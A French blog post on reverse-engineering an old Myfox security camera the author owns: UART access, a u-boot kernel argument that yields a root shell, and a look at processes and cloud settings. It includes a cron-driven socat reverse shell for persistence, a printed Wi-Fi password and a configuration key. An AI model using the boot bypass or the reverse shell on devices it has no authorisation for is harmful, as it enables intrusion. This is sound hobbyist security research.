---
title: "Caméra Myfox"
date: 2026-04-26
tags: ["hardware"]
categories: ["Research"]
description: "Rétro-ingénierie d'une vieille caméra myfox.  "
---

## Introduction

J'ai trouvé une vieille caméra dans le garage de mon père. Cette caméra n'a apparamment jamais fonctionnée et comme je n'avais jamais vraiment fait de hardware, c'était la target parfaite.

## Analyse du Boot et Accès UART

Après avoir enlevé le couvercle de la caméra, grâce au blog post [suivant](https://arthur.lutz.im/blog/2020/04/13/demontage-myfox-security-camera-part-2/), on peut accéder au PCB et on voit les pins RX et TX.

![Photo du hardware](/blog/images/myfox1.png)

Ceux-ci sont difficilement soudables, il faut donc utiliser un setup un peu louche pour pouvoir se connecter en UART à la device. Des pinces à linges, du scotch et des fils souples font l'affaire.

![Photo de l'installation UART](/blog/images/myfox2.png)

Une fois bien branché, on voit les logs de boot du kernel et on obtient un prompt d'authentification.

```
AMBA CLOUD CAM SDK 2.5.5
eased Date: 29/09/2014.00
Test My Fox APP beta 2
Current version: 0.0.0.3
Firmware Released Date: 29/10/2014.00
Builtin MyFox sound, add Firmware Released Date: 24/12/201Built ARCSOFT 5586 CAM ...

Welcome to Ambarella
Myfox login:

```
## AMBOOT

On peut accéder à l'interface du u-boot en spammant ESC avant et pendant le démarrage de celle-ci.

On peut changer le recovery mode path et obtenir un shell en recovery mode.
```
setenv cmdline console=ttyS0 ubi.mtd=lnx root=ubi0:rootfs rw rootfstype=ubifs rdinit=/bin/sh lpj=2392064 snd_soc_core.pmdown_time=500
```

Cela me permets de modifies les arguments de boot pour forcer le noyau à lancer un shell.

On peut ensuite changer le mot de passe root.
On reboot, et on obtient un shell.

## Analyse du Système et Persistance

En regardant les process lancés au démarrage, la liste de processus suivante semble lancer un binaire `qrcode`.

```
root       297  0.0  0.5   3560   700 ?        S    21:37   0:00 /bin/sh /usr/local/LeCam/bin/stream_watchdog.sh start
root      4277  0.0  0.3   3428   468 ?        S    21:53   0:00  \_ sleep 30
root       313  0.0  0.5   3560   672 ?        S    21:37   0:00 /bin/sh /usr/local/LeCam/bin/watchdog.sh LeCam
root       324  0.0  0.4   3560   644 ?        S    21:37   0:00  \_ /bin/sh /usr/local/LeCam/bin/start.sh
root       333  3.6  6.6 168780  8972 ?        Sl   21:37   0:36      \_ /usr/local/LeCam/bin/LeCam start
root       571  0.0  0.4   1956   576 ?        S    21:37   0:00          \_ as_qr
root       571  0.0  0.4   1956   576 ?        S    21:37   0:00          \_ as_qr
root       674  0.0  0.4   3560   616 ?        S    21:37   0:00              \_ sh -c qrcode > /tmp/.qrcode_tmp_file
root       675 42.1  1.5   6736  2148 ?        R    21:37   6:50                  \_ qrcode

```

C'est plutôt intéressant, en sachant que pour synchroniser notre caméra à l'installation on passe par un qrcode.

Une fois le qrcode scanné on obtient l'arbre suivant:

```
root       312  0.0  0.5   3560   672 ?        S    16:50   0:00 /bin/sh /usr/local/LeCam/bin/watchdog.sh LeCam
root       323  0.0  0.4   3560   644 ?        S    16:50   0:00  \_ /bin/sh /usr/local/LeCam/bin/start.sh
root       332  4.2  6.6 168996  8984 ?        Sl   16:50   0:11      \_ /usr/local/LeCam/bin/LeCam start
root      1427  0.0  0.4   3560   636 ?        S    16:54   0:00          \_ sh -c /usr/local/LeCam/bin//wifi_stream.sh managed Livebox\-A190 N5pYGqA2EwTLFmNZa5 >/dev/null 2>&1; echo $?
root      1430  0.1  0.5   3560   724 ?        S    16:54   0:00              \_ /bin/sh /usr/local/LeCam/bin//wifi_stream.sh managed Box_internet mot_de_passe
root      1441  5.5  3.0  13308  4044 ?        S<   16:54   0:01                  \_ test_network_manager Box_internet mot_de_passe

```

Puis notre device est connectée au wifi:
```
2: wlan0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast qlen 1000
    link/ether b0:41:1d:02:c7:5f brd ff:ff:ff:ff:ff:ff
    inet 192.168.1.115/24 brd 192.168.1.255 scope global wlan0
```

## Accès persistant

Maintenant plus besoin de shell via UART. On installe une crontab qui lance un reverse shell vers une autre machine et c'est bon.

```
~ # crontab -l
*/1 * * * * /bin/bash /usr/local/bin/reverse_shell.sh
~ # cat /usr/local/bin/reverse_shell.sh
#!/bin/sh
/root/socat exec:'/bin/sh',pty,stderr,sigint tcp:192.168.1.21:4445
```

Mais la LED est rouge et l'application nous dit que la device n'a pas pu être connectée ...

En lançant le binaire `LeCam` manuellement je me suis rendu compte que les serveurs liés à ce produit sont obsolètes.

```
~ # /usr/local/LeCam/bin/LeCam help
LeCam [action] [parameters]

actions:
	start: start LeCam service.
	stop: stop LeCam service.
	daemon: start LeCam service as a daemon process.

	setting: enter interactive mode to change setting.

	notification: push notification to clients.

	version: show the version.

~ # /usr/local/LeCam/bin/LeCam start
LeCam version: 1.2.30.6696 (Fri Sep 18 15:39:29 CST 2015 root@mcpg-abs-u1204.)
	module: IP camera Myfox (SDK2.5.5) [FullRelay]
	scheme: Normal
	release: Production
SDKs version:
	P2P SDK: 1.1.0.77 - Jun 24 2015 10:30:11
	Purchase SDK: LECAM_SDK_1.0.1.0
	Rtsp2Mp4 SDK: 1.0.0.6683
[LECAM] [22:16:27] curl_global_init(CURL_GLOBAL_ALL) OK
[LECAM] [22:16:27] version : libcurl/7.42.1 OpenSSL/1.0.1m zlib/1.2.3 c-ares/1.9.1
COVER_OPEN
USB Plug In
set_params
format = S16_LE, channels = 1, rate = 16000
chunk_size = 2000,chunk_bytes = 4000,buffer_size = 8000

rm: can't remove '/tmp/Block_IR_Cut_Action': No such file or directory
rm: can't remove '/tmp/Block_IR_Cut_Action': No such file or directory
rm: can't remove '/tmp/Led_force_off': No such file or directory
2026-04-24 22:16:48.200349 [4891] [mdet_svc.cpp(174) thread_proc]Error: motion mdet: Failed to recv data! errno(2) fail_count(1)
Process has exit!

```

En effet l'entreprise a été rachetée depuis et le produit à été refondu.

Le fichier de conf suivant est utilisé notamment pour faire des mises à jour.

```
~ # cat /usr/local/LeCam/bin/cloud.ini
[SERVERINFO]
###### ENKI STG's server ######
server_name=arcsoft.com
xmpp_server_ip=xmpp.closeli.com
relay_server_ip=relayus-w.arcsoftcloud.com
auto_update_server_ip=update.closeli.com

##################################################
###### LeCam Purchase Server Configuration #######
lecam_purchase_server_ip = esd.closeli.com
uDesKey = dy5Oy+HMIpybN8HXcCbnx9yCVr53/+CAiZ55J6M3rvO20j7XYaZxy6fDBsdXo24WwrUu/4Y++Bx0YEYbbnGOvwAA

upns_pnserver =  upns.arcsoftcloud.com
upns_xmpp_name = arcsoft.com
upns_xmpp_ip =  xmpp.closeli.com

argus_api_server_ip = https://argus.closeli.com/argus
argus_server_ip = argus.closeli.com
```

Au final on ne peut pas aller plus loin dans la recherche...

J'ai commencé à reverse le soft, mais comme les serveurs sont down ça n'a pas grand intérêt.

Même si les serveurs originaux sont morts, la caméra est maintenant une Linux box ouverte. Prochaine étape : détourner le flux vidéo vers un serveur RTSP local.

---

## References

https://github.com/santeri3700/opticam_o8_hacking

https://arthur.lutz.im/blog/2020/04/13/demontage-myfox-security-camera-part-2/
